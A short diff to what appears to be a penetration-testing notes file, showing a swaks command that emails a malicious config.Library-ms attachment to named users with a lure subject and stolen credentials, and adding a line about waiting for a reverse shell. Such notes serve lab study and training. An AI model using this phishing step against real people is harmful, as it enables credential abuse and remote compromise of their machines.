@@ -1277,8 +1277,7 @@ Using swaks to send the email:
 ```
 sudo swaks -t username1@mailserver.com -t user2@mailserver.com --from john@mailserver.com --attach @config.Library-ms --server $mailserver_ip --body @body.txt --header "Subject: Git Vulnerability" --suppress-data -ap
 ```
-You will be asked for a login. Enter the credentials founded and send the e-mail.
-
+You will be asked for a login. Enter the credentials founded and send the e-mail. Now just wait for your reverse shell
 
 ## Pivoting
 
